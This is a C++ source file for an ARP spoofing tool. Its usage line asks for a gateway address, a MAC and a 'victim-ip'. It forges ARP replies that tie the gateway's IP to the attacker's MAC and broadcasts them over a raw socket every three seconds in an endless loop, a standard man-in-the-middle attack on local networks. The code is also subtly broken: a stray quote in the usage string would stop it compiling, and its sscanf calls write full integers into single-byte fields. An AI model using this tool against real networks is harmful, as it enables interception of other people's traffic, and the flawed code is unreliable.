#include <iostream>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/if_ether.h>
#include <netinet/in.h>
#include <net/if.h>
#include <netpacket/packet.h>
using namespace std;

#define PKSIZE sizeof(struct ARP_h)

struct ETH_h{
    unsigned char	target[ETH_ALEN];
    unsigned char	source[ETH_ALEN];
    unsigned short	proto;
};

struct ARP_h{
    struct ETH_h ethh;

    unsigned short  ar_hrd;         /* format of hardware address   */
    unsigned short  ar_pro;         /* format of protocol address   */
    unsigned char   ar_hln;         /* length of hardware address   */
    unsigned char   ar_pln;         /* length of protocol address   */
    unsigned short  ar_op;          /* ARP opcode (command)         */

    unsigned char   ar_sha[ETH_ALEN];       /* sender hardware address      */
    unsigned char   ar_sip[4];              /* sender IP address            */
    unsigned char   ar_tha[ETH_ALEN];       /* target hardware address      */
    unsigned char   ar_tip[4];


};

int main(int argc, char **argv){

    if(argc < 5){
        cout << "[+]Error" << endl;
        cout << "./ARP interface gateway-address your-mac victim-ip"" << endl;
        exit(1);
    }

    struct ARP_h packet, *pacote;
    pacote = (struct ARP_h *) &packet;
    int sock;

    struct sockaddr_ll device;

    int s;

    packet.ethh.proto = htons(ETH_P_ARP);
    memset(packet.ethh.target, 0xff, ETH_ALEN);
    memset(packet.ar_tha, 00, ETH_ALEN);
   // memset(packet.ar_tip, 0x00, 4);


    packet.ar_hrd = htons(0x001);
    packet.ar_pro = htons(0x800);
    packet.ar_hln = 0x6;
    packet.ar_pln = 0x4;
    packet.ar_op = htons(0x002);
    
    char ips[] = "192.168.1.1";
    
    char eth[] = "eth0";
    
    sscanf(argv[3], "%x:%x:%x:%x:%x:%x",
                                    (unsigned int *) &pacote->ar_sha[0],
                                    (unsigned int *) &pacote->ar_sha[1],
                                    (unsigned int *) &pacote->ar_sha[2],
                                    (unsigned int *) &pacote->ar_sha[3],
                                    (unsigned int *) &pacote->ar_sha[4],
                                    (unsigned int *) &pacote->ar_sha[5]);

    sscanf(argv[2] ,"%d.%d.%d.%d",  (int *) &pacote->ar_sip[0],
                                    (int *) &pacote->ar_sip[1],
                                    (int *) &pacote->ar_sip[2],
                                    (int *) &pacote->ar_sip[3]);

    sscanf(argv[4], "%d.%d.%d.%d",  (int *)  &pacote->ar_tip[0],
                                    (int *) &pacote->ar_tip[1],
                                    (int *) &pacote->ar_tip[2],
                                    (int *) &pacote->ar_tip[3]);

    memcpy(packet.ethh.source, packet.ar_sha, ETH_ALEN);
    memset(&device, 0, sizeof(device));
    device.sll_ifindex = if_nametoindex(argv[1]);
    device.sll_family = AF_PACKET;
    memcpy(device.sll_addr, packet.ar_sha, ETH_ALEN);
    device.sll_halen = htons(ETH_ALEN);


    sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));

    while(1){
        sendto(sock, (unsigned char *)&packet, PKSIZE, 0, (struct sockaddr *) &device, sizeof(device));
        cout << "ARP enviado\n";
        sleep(3);
    }
    
}
